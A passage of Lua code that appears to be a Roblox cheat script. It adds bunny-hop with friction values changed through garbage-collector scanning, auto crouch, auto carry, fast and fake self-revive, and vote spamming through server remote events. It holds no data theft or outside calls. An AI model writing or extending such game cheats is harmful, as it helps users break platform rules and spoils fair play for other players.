                    end
                end
                getgenv().AutoJoinConnections = nil
            end
        end
    end
})

game:GetService("Players").LocalPlayer.PlayerScripts.Events.temporary_events.JumpReact:Fire()
game:GetService("Players").LocalPlayer.PlayerScripts.Events.temporary_events.EndJump:Fire()

getgenv().autoJumpType = "Bounce"
getgenv().bhopMode = "Acceleration"
getgenv().bhopAccelValue = -0.5
getgenv().bhopHoldActive = false
getgenv().autoJumpEnabled = false
getgenv().jumpCooldown = 0.7
featureStates = featureStates or {}
featureStates.BhopGuiVisible = false
featureStates.Bhop = false
featureStates.BhopHold = false

player = game:GetService("Players").LocalPlayer
RunService = game:GetService("RunService")
UserInputService = game:GetService("UserInputService")
Players = game:GetService("Players")
Tabs = Tabs or {Auto = {}}

isMobile = isMobile or UserInputService.TouchEnabled

bhopConnection = nil
bhopLoaded = false
bhopKeyConnection = nil
characterConnection = nil
frictionTables = {}

Character = nil
Humanoid = nil
HumanoidRootPart = nil
LastJump = 0

GROUND_CHECK_DISTANCE = 3.5
MAX_SLOPE_ANGLE = 45
AIR_RANGE = 0.1

findFrictionTables = function()
    frictionTables = {}
    for _, t in pairs(getgc(true)) do
        if type(t) == "table" and rawget(t, "Friction") then
            table.insert(frictionTables, {obj = t, original = t.Friction})
        end
    end
end

setFriction = function(value)
    for _, e in ipairs(frictionTables) do
        if e.obj and type(e.obj) == "table" and rawget(e.obj, "Friction") then
            e.obj.Friction = value
        end
    end
end

resetBhopFriction = function()
    for _, e in ipairs(frictionTables) do
        if e.obj and type(e.obj) == "table" and rawget(e.obj, "Friction") then
            e.obj.Friction = e.original
        end
    end
    frictionTables = {}
end

applyBhopFriction = function()
    if getgenv().bhopMode == "Acceleration" then
        findFrictionTables()
        if #frictionTables > 0 then
            setFriction(getgenv().bhopAccelValue or -0.5)
        end
    else
        resetBhopFriction()
    end
end

IsOnGround = function()
    if not Character or not HumanoidRootPart or not Humanoid then return false end

    state = Humanoid:GetState()
    if state == Enum.HumanoidStateType.Jumping or 
       state == Enum.HumanoidStateType.Freefall or
       state == Enum.HumanoidStateType.Swimming then
        return false
    end

    raycastParams = RaycastParams.new()
    raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
    raycastParams.FilterDescendantsInstances = {Character}
    raycastParams.IgnoreWater = true

    rayOrigin = HumanoidRootPart.Position
    rayDirection = Vector3.new(0, -GROUND_CHECK_DISTANCE, 0)
    raycastResult = workspace:Raycast(rayOrigin, rayDirection, raycastParams)

    if not raycastResult then return false end

    surfaceNormal = raycastResult.Normal
    angle = math.deg(math.acos(surfaceNormal:Dot(Vector3.new(0, 1, 0))))

    return angle <= MAX_SLOPE_ANGLE
end

updateBhop = function()
    if not bhopLoaded then return end
    
    character = player.Character
    humanoid = character and character:FindFirstChild("Humanoid")
    if not character or not humanoid then
        return
    end

    isBhopActive = getgenv().autoJumpEnabled or getgenv().bhopHoldActive

    if isBhopActive then
        now = tick()
        if IsOnGround() and (now - LastJump) > getgenv().jumpCooldown then
            if getgenv().autoJumpType == "Realistic" then
                game:GetService("Players").LocalPlayer.PlayerScripts.Events.temporary_events.JumpReact:Fire()
                task.wait(0.1)
                game:GetService("Players").LocalPlayer.PlayerScripts.Events.temporary_events.EndJump:Fire()
            else
                humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
            end
            LastJump = now
        end
    end
end

loadBhop = function()
    if bhopLoaded then return end
    
    bhopLoaded = true
    
    if bhopConnection then
        bhopConnection:Disconnect()
    end
    bhopConnection = RunService.Heartbeat:Connect(updateBhop)
    applyBhopFriction()
end

unloadBhop = function()
    if not bhopLoaded then return end
    
    bhopLoaded = false
    
    if bhopConnection then
        bhopConnection:Disconnect()
        bhopConnection = nil
    end
    
    getgenv().bhopHoldActive = false
    resetBhopFriction()
end

checkBhopState = function()
    shouldLoad = getgenv().autoJumpEnabled or getgenv().bhopHoldActive
    
    if shouldLoad then
        loadBhop()
    else
        unloadBhop()
    end
end

reapplyBhopOnRespawn = function()
    if getgenv().autoJumpEnabled or getgenv().bhopHoldActive then
        wait(0.5)
        applyBhopFriction()
        checkBhopState()
    end
end

makeDraggable = function(frame)
    frame.Active = true
    frame.Draggable = true
    
    dragDetector = Instance.new("UIDragDetector")
    dragDetector.Parent = frame
    
    originalBackground = frame.BackgroundColor3
    originalTransparency = frame.BackgroundTransparency
    
    frame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            frame.BackgroundTransparency = originalTransparency - 0.1
        end
    end)
    
    frame.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            frame.BackgroundTransparency = originalTransparency
        end
    end)
end

setupBhopKeybind = function()
    if bhopKeyConnection then
        bhopKeyConnection:Disconnect()
    end
    
    bhopKeyConnection = UserInputService.InputBegan:Connect(function(input, gameProcessedEvent)
        if gameProcessedEvent then return end
        if input.KeyCode == Enum.KeyCode.B and featureStates.BhopGuiVisible then
            getgenv().autoJumpEnabled = not getgenv().autoJumpEnabled
            featureStates.Bhop = getgenv().autoJumpEnabled
            
            if BhopToggle then
                BhopToggle:Set(getgenv().autoJumpEnabled)
            end
            
            if jumpToggleBtn then
                jumpToggleBtn.Text = getgenv().autoJumpEnabled and "On" or "Off"
                jumpToggleBtn.BackgroundColor3 = getgenv().autoJumpEnabled and Color3.fromRGB(0, 120, 80) or Color3.fromRGB(120, 0, 0)
            end
            
            checkBhopState()
        end
    end)
end

setupJumpButton = function()
    success, err = pcall(function()
        touchGui = player:WaitForChild("PlayerGui", 5):WaitForChild("TouchGui", 5)
        if not touchGui then return end
        touchControlFrame = touchGui:WaitForChild("TouchControlFrame", 5)
        if not touchControlFrame then return end
        jumpButton = touchControlFrame:WaitForChild("JumpButton", 5)
        if not jumpButton then return end
        
        jumpButton.MouseButton1Down:Connect(function()
            if featureStates.BhopHold then
                getgenv().bhopHoldActive = true
                checkBhopState()
            end
        end)
        
        jumpButton.MouseButton1Up:Connect(function()
            getgenv().bhopHoldActive = false
            checkBhopState()
        end)
    end)
end

createBhopGui = function(yOffset)
    bhopGuiOld = player.PlayerGui:FindFirstChild("BhopGui")
    if bhopGuiOld then bhopGuiOld:Destroy() end
    
    bhopGui = Instance.new("ScreenGui")
    bhopGui.Name = "BhopGui"
    bhopGui.IgnoreGuiInset = true
    bhopGui.ResetOnSpawn = false
    bhopGui.Enabled = isMobile and featureStates.BhopGuiVisible or false
    bhopGui.Parent = player.PlayerGui

    frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 60, 0, 60)
    frame.Position = UDim2.new(0.5, -30, 0.12 + (yOffset or 0), 0)
    frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    frame.BackgroundTransparency = 0.35
    frame.BorderSizePixel = 0
    frame.Parent = bhopGui
    
    makeDraggable(frame)

    corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 6)
    corner.Parent = frame

    stroke = Instance.new("UIStroke")
    stroke.Color = Color3.fromRGB(150, 150, 150)
    stroke.Thickness = 2
    stroke.Parent = frame

    label = Instance.new("TextLabel")
    label.Text = "Bhop"
    label.Size = UDim2.new(0.9, 0, 0.5, 0)
    label.Position = UDim2.new(0.05, 0, 0, 0)
    label.BackgroundTransparency = 1
    label.TextColor3 = Color3.fromRGB(255, 255, 255)
    label.Font = Enum.Font.Roboto
    label.TextSize = 16
    label.TextXAlignment = Enum.TextXAlignment.Center
    label.TextYAlignment = Enum.TextYAlignment.Center
    label.TextScaled = true
    label.Parent = frame

    bhopGuiButton = Instance.new("TextButton")
    bhopGuiButton.Name = "ToggleButton"
    bhopGuiButton.Text = getgenv().autoJumpEnabled and "On" or "Off"
    bhopGuiButton.Size = UDim2.new(0.9, 0, 0.5, 0)
    bhopGuiButton.Position = UDim2.new(0.05, 0, 0.5, 0)
    bhopGuiButton.BackgroundColor3 = getgenv().autoJumpEnabled and Color3.fromRGB(0, 120, 80) or Color3.fromRGB(120, 0, 0)
    bhopGuiButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    bhopGuiButton.Font = Enum.Font.Roboto
    bhopGuiButton.TextSize = 14
    bhopGuiButton.TextXAlignment = Enum.TextXAlignment.Center
    bhopGuiButton.TextYAlignment = Enum.TextYAlignment.Center
    bhopGuiButton.TextScaled = true
    bhopGuiButton.Parent = frame

    buttonCorner = Instance.new("UICorner")
    buttonCorner.CornerRadius = UDim.new(0, 4)
    buttonCorner.Parent = bhopGuiButton

    bhopGuiButton.MouseButton1Click:Connect(function()
        getgenv().autoJumpEnabled = not getgenv().autoJumpEnabled
        featureStates.Bhop = getgenv().autoJumpEnabled
        bhopGuiButton.Text = getgenv().autoJumpEnabled and "On" or "Off"
        bhopGuiButton.BackgroundColor3 = getgenv().autoJumpEnabled and Color3.fromRGB(0, 120, 80) or Color3.fromRGB(120, 0, 0)
        
        if BhopToggle then
            BhopToggle:Set(getgenv().autoJumpEnabled)
        end
        
        checkBhopState()
    end)

    return bhopGui, bhopGuiButton
end

jumpGui, jumpToggleBtn = createBhopGui(0.12)

setupJumpButton()
setupBhopKeybind()

RunService.Heartbeat:Connect(function()
    if not Character or not Character:IsDescendantOf(workspace) then
        Character = player.Character or player.CharacterAdded:Wait()
        if Character then
            Humanoid = Character:FindFirstChildOfClass("Humanoid")
            HumanoidRootPart = Character:FindFirstChild("HumanoidRootPart")
        else
            Humanoid = nil
            HumanoidRootPart = nil
        end
    end
end)

if characterConnection then
    characterConnection:Disconnect()
end
characterConnection = player.CharacterAdded:Connect(function(character)
    Character = character
    Humanoid = character:WaitForChild("Humanoid")
    HumanoidRootPart = character:WaitForChild("HumanoidRootPart")
    setupJumpButton()
    reapplyBhopOnRespawn()
end)

AutoJumpTypeDropdown = Tabs.Auto:Dropdown({
    Title = "Auto Jump type",
    Flag = "AutoJumpTypeDropdown",
    Values = {"Bounce", "Realistic"},
    Value = "Bounce",
    Callback = function(value)
        getgenv().autoJumpType = value
    end
})

BhopToggle = Tabs.Auto:Toggle({
    Title = "Bhop",
    Flag = "BhopToggle",
    Value = false,
    Callback = function(state)
        featureStates.Bhop = state
        getgenv().autoJumpEnabled = state
        
        if jumpGui and jumpToggleBtn then
            jumpToggleBtn.Text = state and "On" or "Off"
            jumpToggleBtn.BackgroundColor3 = state and Color3.fromRGB(0, 120, 80) or Color3.fromRGB(120, 0, 0)
            jumpGui.Enabled = isMobile and featureStates.BhopGuiVisible or false
        end
        
        checkBhopState()
    end
})

BhopHoldToggle = Tabs.Auto:Toggle({
    Title = "Bhop (Hold Space/Jump)",
    Flag = "BhopHoldToggle",
    Value = false,
    Callback = function(state)
        featureStates.BhopHold = state
        if not state then
            getgenv().bhopHoldActive = false
            checkBhopState()
        end
    end
})

BhopShortcutToggle = Tabs.Auto:Toggle({
    Title = "Bhop Shortcut",
    Flag = "BhopShortcutToggle",
    Desc = "Show Bhop GUI For quick Toggle or press B to Toggle Bhop (Auto jump)",
    Value = false,
    Callback = function(state)
        featureStates.BhopGuiVisible = state
        if jumpGui then
            jumpGui.Enabled = isMobile and state or false
        end
        setupBhopKeybind()
    end
})

BhopModeDropdown = Tabs.Auto:Dropdown({
    Title = "Bhop Mode",
    Flag = "BhopModeDropdown",
    Values = {"Acceleration", "No Acceleration"},
    Value = "Acceleration",
    Callback = function(value)
        getgenv().bhopMode = value
        checkBhopState()
    end
})

BhopAccelInput = Tabs.Auto:Input({
    Title = "Bhop Acceleration (Negative Only)",
    Flag = "BhopAccelInput",
    Placeholder = "-0.5",
    Numeric = true,
    Callback = function(value)
        if tostring(value):sub(1, 1) == "-" then
            n = tonumber(value)
            if n then
                getgenv().bhopAccelValue = n
                if getgenv().autoJumpEnabled or getgenv().bhopHoldActive then
                    applyBhopFriction()
                end
            end
        end
    end
})

JumpCooldownInput = Tabs.Auto:Input({
    Title = "Jump Cooldown (Seconds)",
    Flag = "JumpCooldownInput",
    Placeholder = "0.7",
    Numeric = true,
    Callback = function(value)
        n = tonumber(value)
        if n and n > 0 then
            getgenv().jumpCooldown = n
        end
    end
})

UserInputService.InputBegan:Connect(function(input, gameProcessedEvent)
    if gameProcessedEvent then return end
    if input.KeyCode == Enum.KeyCode.Space and featureStates.BhopHold then
        getgenv().bhopHoldActive = true
        checkBhopState()
    end
end)

UserInputService.InputEnded:Connect(function(input)
    if input.KeyCode == Enum.KeyCode.Space then
        getgenv().bhopHoldActive = false
        checkBhopState()
    end
end)

Players.PlayerRemoving:Connect(function(leavingPlayer)
    if leavingPlayer == player then
        unloadBhop()
        if jumpGui then
            jumpGui:Destroy()
        end
        if bhopKeyConnection then
            bhopKeyConnection:Disconnect()
        end
        if characterConnection then
            characterConnection:Disconnect()
        end
    end
end)

checkBhopState()

getgenv().crouchGuiVisible = false

local previousCrouchState = false
local spamDown = true
local crouchConnection = nil
local keybindConnection = nil
local guiInstance = nil

local function fireKeybind(down, key)
    local ohTable = {
        ["Down"] = down,
        ["Key"] = key
    }
    local event = game:GetService("Players").LocalPlayer:WaitForChild("PlayerScripts"):WaitForChild("Events"):WaitForChild("temporary_events"):WaitForChild("UseKeybind")
    event:Fire(ohTable)
end

local function makeDraggable(frame)
    frame.Active = true
    frame.Draggable = true
    
    local dragDetector = Instance.new("UIDragDetector")
    dragDetector.Parent = frame
    
    local originalBackground = frame.BackgroundColor3
    local originalTransparency = frame.BackgroundTransparency
    
    frame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            frame.BackgroundTransparency = originalTransparency - 0.1
        end
    end)
    
    frame.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            frame.BackgroundTransparency = originalTransparency
        end
    end)
end

local function createCrouchGui(yOffset)
    local crouchGuiOld = playerGui:FindFirstChild("CrouchGui")
    if crouchGuiOld then crouchGuiOld:Destroy() end
    
    local crouchGui = Instance.new("ScreenGui")
    crouchGui.Name = "CrouchGui"
    crouchGui.IgnoreGuiInset = true
    crouchGui.ResetOnSpawn = false
    crouchGui.Enabled = getgenv().crouchGuiVisible
    crouchGui.Parent = playerGui

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 50, 0, 50)
    frame.Position = UDim2.new(0.5, -25, 0.12 + (yOffset or 0), 0)
    frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    frame.BackgroundTransparency = 0.35
    frame.BorderSizePixel = 0
    frame.Parent = crouchGui
    makeDraggable(frame)

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 6)
    corner.Parent = frame

    local stroke = Instance.new("UIStroke")
    stroke.Color = Color3.fromRGB(150, 150, 150)
    stroke.Thickness = 2
    stroke.Parent = frame

    local label = Instance.new("TextLabel")
    label.Text = "Auto Crouch"
    label.Size = UDim2.new(0.9, 0, 0.6, 0)
    label.Position = UDim2.new(0.05, 0, 0, 0)
    label.BackgroundTransparency = 1
    label.TextColor3 = Color3.fromRGB(255, 255, 255)
    label.Font = Enum.Font.Roboto
    label.TextSize = 12
    label.TextXAlignment = Enum.TextXAlignment.Center
    label.TextYAlignment = Enum.TextYAlignment.Center
    label.TextScaled = true
    label.Parent = frame

    local crouchGuiButton = Instance.new("TextButton")
    crouchGuiButton.Name = "ToggleButton"
    crouchGuiButton.Text = featureStates.AutoCrouch and "On" or "Off"
    crouchGuiButton.Size = UDim2.new(0.9, 0, 0.4, 0)
    crouchGuiButton.Position = UDim2.new(0.05, 0, 0.6, 0)
    crouchGuiButton.BackgroundColor3 = featureStates.AutoCrouch and Color3.fromRGB(0, 120, 80) or Color3.fromRGB(120, 0, 0)
    crouchGuiButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    crouchGuiButton.Font = Enum.Font.Roboto
    crouchGuiButton.TextSize = 12
    crouchGuiButton.TextXAlignment = Enum.TextXAlignment.Center
    crouchGuiButton.TextYAlignment = Enum.TextYAlignment.Center
    crouchGuiButton.TextScaled = true
    crouchGuiButton.Parent = frame

    local buttonCorner = Instance.new("UICorner")
    buttonCorner.CornerRadius = UDim.new(0, 4)
    buttonCorner.Parent = crouchGuiButton

    crouchGuiButton.MouseButton1Click:Connect(function()
        featureStates.AutoCrouch = not featureStates.AutoCrouch
        crouchGuiButton.Text = featureStates.AutoCrouch and "On" or "Off"
        crouchGuiButton.BackgroundColor3 = featureStates.AutoCrouch and Color3.fromRGB(0, 120, 80) or Color3.fromRGB(120, 0, 0)
    end)

    guiInstance = crouchGui
end

local function setupAutoCrouchListeners()
    if crouchConnection then crouchConnection:Disconnect() end
    crouchConnection = RunService.Heartbeat:Connect(function()
        if not featureStates.AutoCrouch then return end
        local character = Players.LocalPlayer.Character
        if not character or not character:FindFirstChild("Humanoid") then return end

        local humanoid = character.Humanoid
        local mode = featureStates.AutoCrouchMode

        if mode == "Normal" then
            fireKeybind(spamDown, "Crouch")
            spamDown = not spamDown
        else
            local isAir = (humanoid.FloorMaterial == Enum.Material.Air) and (humanoid:GetState() ~= Enum.HumanoidStateType.Seated)
            local shouldCrouch = (mode == "Air" and isAir) or (mode == "Ground" and not isAir)
            if shouldCrouch ~= previousCrouchState then
                fireKeybind(shouldCrouch, "Crouch")
                previousCrouchState = shouldCrouch
            end
        end
    end)

    if keybindConnection then keybindConnection:Disconnect() end
    keybindConnection = UserInputService.InputBegan:Connect(function(input, gameProcessed)
        if gameProcessed then return end
        if input.KeyCode == Enum.KeyCode.C and getgenv().crouchGuiVisible then
            featureStates.AutoCrouch = not featureStates.AutoCrouch
            local gui = playerGui:FindFirstChild("CrouchGui")
            if gui then
                local button = gui.Frame:FindFirstChild("ToggleButton")
                if button then
                    button.Text = featureStates.AutoCrouch and "On" or "Off"
                    button.BackgroundColor3 = featureStates.AutoCrouch and Color3.fromRGB(0, 120, 80) or Color3.fromRGB(120, 0, 0)
                end
            end
        end
    end)

    Players.LocalPlayer.CharacterAdded:Connect(function(newChar)
        previousCrouchState = false
        spamDown = true
    end)
end

setupAutoCrouchListeners()

AutoCrouchToggle = Tabs.Auto:Toggle({
    Title = "Auto Crouch",
    Flag = "AutoCrouchToggle",
    Desc = "Press C to toggle if you on keyboard",
    Value = false,
    Callback = function(state)
        getgenv().crouchGuiVisible = state
        if state then
            if not guiInstance then
                createCrouchGui()
            else
                guiInstance.Enabled = true
            end
        else
            if guiInstance then
                guiInstance.Enabled = false
            end
        end
    end
})
AutoCrouchModeDropdown = Tabs.Auto:Dropdown({
    Title = "Auto Crouch Mode",
    Flag = "AutoCrouchModeDropdown",
    Values = {"Air", "Normal", "Ground"},
    Value = "Air",
    Callback = function(value)
        featureStates.AutoCrouchMode = value
    end
})


local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")

local LocalPlayer = Players.LocalPlayer
local playerGui = LocalPlayer:WaitForChild("PlayerGui", 5)

local function makeDraggable(frame)
    local dragging = false
    local dragStart = nil
    local startPos = nil

    frame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = frame.Position
        end
    end)

    frame.InputChanged:Connect(function(input)
        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
            local delta = input.Position - dragStart
            frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)

    UserInputService.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = false
        end
    end)
end

local function makeDraggable(frame)
    frame.Active = true
    frame.Draggable = true
    
    local dragDetector = Instance.new("UIDragDetector")
    dragDetector.Parent = frame
    
    local originalBackground = frame.BackgroundColor3
    local originalTransparency = frame.BackgroundTransparency
    
    frame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            frame.BackgroundTransparency = originalTransparency - 0.1
        end
    end)
    
    frame.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            frame.BackgroundTransparency = originalTransparency
        end
    end)
end

local function createAutoCarryGui(yOffset)
    local autoCarryGuiOld = playerGui:FindFirstChild("AutoCarryGui")
    if autoCarryGuiOld then
        autoCarryGuiOld:Destroy()
    end
    
    local autoCarryGui = Instance.new("ScreenGui")
    autoCarryGui.Name = "AutoCarryGui"
    autoCarryGui.IgnoreGuiInset = true
    autoCarryGui.ResetOnSpawn = false
    autoCarryGui.Enabled = getgenv().autoCarryGuiVisible
    autoCarryGui.Parent = playerGui

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 60, 0, 60)
    frame.Position = UDim2.new(0.5, -30, 0.12 + (yOffset or 0), 0)
    frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    frame.BackgroundTransparency = 0.35
    frame.BorderSizePixel = 0
    frame.Parent = autoCarryGui
    makeDraggable(frame)

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 6)
    corner.Parent = frame

    local stroke = Instance.new("UIStroke")
    stroke.Color = Color3.fromRGB(150, 150, 150)
    stroke.Thickness = 2
    stroke.Parent = frame

    local label = Instance.new("TextLabel")
    label.Text = "Auto"
    label.Size = UDim2.new(0.9, 0, 0.3, 0)
    label.Position = UDim2.new(0.05, 0, 0.05, 0)
    label.BackgroundTransparency = 1
    label.TextColor3 = Color3.fromRGB(255, 255, 255)
    label.Font = Enum.Font.Roboto
    label.TextSize = 14
    label.TextXAlignment = Enum.TextXAlignment.Center
    label.TextYAlignment = Enum.TextYAlignment.Center
    label.TextScaled = true
    label.Parent = frame

    local subLabel = Instance.new("TextLabel")
    subLabel.Text = "Carry"
    subLabel.Size = UDim2.new(0.9, 0, 0.3, 0)
    subLabel.Position = UDim2.new(0.05, 0, 0.3, 0)
    subLabel.BackgroundTransparency = 1
    subLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    subLabel.Font = Enum.Font.Roboto
    subLabel.TextSize = 14
    subLabel.TextXAlignment = Enum.TextXAlignment.Center
    subLabel.TextYAlignment = Enum.TextYAlignment.Center
    subLabel.TextScaled = true
    subLabel.Parent = frame

    local autoCarryGuiButton = Instance.new("TextButton")
    autoCarryGuiButton.Name = "ToggleButton"
    autoCarryGuiButton.Text = featureStates.AutoCarry and "On" or "Off"
    autoCarryGuiButton.Size = UDim2.new(0.9, 0, 0.35, 0)
    autoCarryGuiButton.Position = UDim2.new(0.05, 0, 0.6, 0)
    autoCarryGuiButton.BackgroundColor3 = featureStates.AutoCarry and Color3.fromRGB(0, 120, 80) or Color3.fromRGB(120, 0, 0)
    autoCarryGuiButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    autoCarryGuiButton.Font = Enum.Font.Roboto
    autoCarryGuiButton.TextSize = 12
    autoCarryGuiButton.TextXAlignment = Enum.TextXAlignment.Center
    autoCarryGuiButton.TextYAlignment = Enum.TextYAlignment.Center
    autoCarryGuiButton.TextScaled = true
    autoCarryGuiButton.Parent = frame

    local buttonCorner = Instance.new("UICorner")
    buttonCorner.CornerRadius = UDim.new(0, 4)
    buttonCorner.Parent = autoCarryGuiButton

    autoCarryGuiButton.MouseButton1Click:Connect(function()
        featureStates.AutoCarry = not featureStates.AutoCarry
        if featureStates.AutoCarry then
            startAutoCarry()
        else
            stopAutoCarry()
        end
        autoCarryGuiButton.Text = featureStates.AutoCarry and "On" or "Off"
        autoCarryGuiButton.BackgroundColor3 = featureStates.AutoCarry and Color3.fromRGB(0, 120, 80) or Color3.fromRGB(120, 0, 0)
    end)
end

local autoCarryInputConnection = UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if input.KeyCode == Enum.KeyCode.X and getgenv().autoCarryGuiVisible then
        featureStates.AutoCarry = not featureStates.AutoCarry
        if featureStates.AutoCarry then
            startAutoCarry()
        else
            stopAutoCarry()
        end
        local autoCarryGui = playerGui:FindFirstChild("AutoCarryGui")
        if autoCarryGui and autoCarryGui.Enabled then
            local button = autoCarryGui.Frame:FindFirstChild("ToggleButton")
            if button then
                button.Text = featureStates.AutoCarry and "On" or "Off"
                button.BackgroundColor3 = featureStates.AutoCarry and Color3.fromRGB(0, 120, 80) or Color3.fromRGB(120, 0, 0)
            end
        end
        WindUI:Notify({
            Title = "Auto Carry",
            Content = "Auto Carry " .. (featureStates.AutoCarry and "enabled" or "disabled"),
            Duration = 2
        })
    end
end)

local function toggleAutoCarryGUI(state)
    getgenv().autoCarryGuiVisible = state
    local autoCarryGui = playerGui:FindFirstChild("AutoCarryGui")
    if autoCarryGui then
        autoCarryGui.Enabled = state
    end
    if state then
        WindUI:Notify({
            Title = "Auto Carry GUI",
            Content = "GUI is enabled. Press X to toggle auto carry.",
            Duration = 3
        })
    else
        WindUI:Notify({
            Title = "Auto Carry GUI",
            Content = "GUI and keybind disabled.",
            Duration = 3
        })
    end
end

AutoCarryKeybindToggle = Tabs.Auto:Toggle({
    Title = "Auto carry keybind/button",
    Flag = "AutoCarryKeybindToggle",
    Desc = "Toggle gui or keybind for quick enable auto carry",
    Icon = "toggle-right",
    Value = false,
    Callback = function(state)
        toggleAutoCarryGUI(state)
    end
})

createAutoCarryGui(0)
FastReviveToggle = Tabs.Auto:Toggle({
    Title = "Fast Revive",
    Flag = "FastReviveToggle",
    Value = false,
    Callback = function(state)
        featureStates.FastRevive = state
        if state then
            startAutoRevive()
        else
            stopAutoRevive()
        end
    end
})

FastReviveMethodDropdown = Tabs.Auto:Dropdown({
    Title = "Fast Revive Method",
    Flag = "FastReviveMethodDropdown",
    Values = {"Auto", "Interact"},
    Value = "Interact",
    Callback = function(value)
        featureStates.FastReviveMethod = value
        
        stopAutoRevive()
        if featureStates.FastReviveMethod == "Interact" then
            featureStates.interactHookActive = false
        end
        
        if featureStates.FastRevive then
            startAutoRevive()
        end
    end
})
    AutoVoteDropdown = Tabs.Auto:Dropdown({
        Title = "Auto Vote Map",
        Flag = "AutoVoteDropdown",
        Values = {"Map 1", "Map 2", "Map 3", "Map 4"},
        Value = "Map 1",
        Callback = function(value)
            if value == "Map 1" then
                featureStates.SelectedMap = 1
            elseif value == "Map 2" then
                featureStates.SelectedMap = 2
            elseif value == "Map 3" then
                featureStates.SelectedMap = 3
            elseif value == "Map 4" then
                featureStates.SelectedMap = 4
            end
        end
    })

    AutoVoteToggle = Tabs.Auto:Toggle({
        Title = "Auto Vote",
        Flag = "AutoVoteToggle",
        Value = false,
        Callback = function(state)
            featureStates.AutoVote = state
            if state then
                startAutoVote()
            else
                stopAutoVote()
            end
        end
    })
AutoVoteModeToggle = Tabs.Auto:Toggle({
    Title = "Auto Vote Game Mode",
        Flag = "AutoVoteModeToggle",
    Value = false,
    Callback = function(state)
        if state then
            local voteConnection
            voteConnection = RunService.Heartbeat:Connect(function()
                local voteEvent = ReplicatedStorage:WaitForChild("Events"):WaitForChild("Player"):WaitForChild("Vote")
                if voteEvent then
                    if featureStates.SelectedVoteMode == 1 then
                        voteEvent:FireServer(1, true)
                    elseif featureStates.SelectedVoteMode == 2 then
                        voteEvent:FireServer(2, true)
                    elseif featureStates.SelectedVoteMode == 3 then
                        voteEvent:FireServer(3, true)
                    elseif featureStates.SelectedVoteMode == 4 then
                        voteEvent:FireServer(4, true)
                    end
                end
            end)
            
            getgenv().AutoVoteModeConnection = voteConnection
        else
            if getgenv().AutoVoteModeConnection then
                getgenv().AutoVoteModeConnection:Disconnect()
                getgenv().AutoVoteModeConnection = nil
            end
        end
    end
})

AutoVoteModeDropdown = Tabs.Auto:Dropdown({
    Title = "Vote Mode",
    Flag = "AutoVoteModeDropdown",
    Values = {"Mode 1", "Mode 2", "Mode 3", "Mode 4"},
    Value = "Mode 1",
    Callback = function(value)
        if value == "Mode 1" then
            featureStates.SelectedVoteMode = 1
        elseif value == "Mode 2" then
            featureStates.SelectedVoteMode = 2
        elseif value == "Mode 3" then
            featureStates.SelectedVoteMode = 3
        elseif value == "Mode 4" then
            featureStates.SelectedVoteMode = 4
        end
    end
})
featureStates.SelfReviveMethod = "Spawnpoint"
local lastSavedPosition = nil
local respawnConnection = nil
local AutoSelfReviveConnection = nil
local hasRevived = false
local isReviving = false

AutoSelfReviveToggle = Tabs.Auto:Toggle({
    Title = "Auto Self Revive",
    Flag = "AutoSelfReviveToggle",
    Value = false,
    Callback = function(state)
        featureStates.AutoSelfRevive = state
        if state then
            if AutoSelfReviveConnection then
                AutoSelfReviveConnection:Disconnect()
            end
            if respawnConnection then
                respawnConnection:Disconnect()
            end
            
            local character = player.Character
            if character then
                local humanoid = character:WaitForChild("Humanoid")
                local hrp = character:WaitForChild("HumanoidRootPart")
                
                AutoSelfReviveConnection = character:GetAttributeChangedSignal("Downed"):Connect(function()
                    local isDowned = character:GetAttribute("Downed")
                    if isDowned and not isReviving then
                        isReviving = true
                        
                        if featureStates.SelfReviveMethod == "Spawnpoint" then
                            if not hasRevived then
                                hasRevived = true
                                pcall(function()
                                    ReplicatedStorage.Events.Player.ChangePlayerMode:FireServer(true)
                                end)
                                task.delay(10, function()
                                    hasRevived = false
                                end)
                                task.delay(1, function()
                                    isReviving = false
                                end)
                            else
                                isReviving = false
                            end
                        elseif featureStates.SelfReviveMethod == "Fake Revive" then
                            if hrp then
                                lastSavedPosition = hrp.Position
                            end
                            
                            task.spawn(function()
                                pcall(function()
                                    ReplicatedStorage:WaitForChild("Events"):WaitForChild("Player"):WaitForChild("ChangePlayerMode"):FireServer(true)
                                end)
                                
                                local newCharacter
                                repeat
                                    newCharacter = player.Character
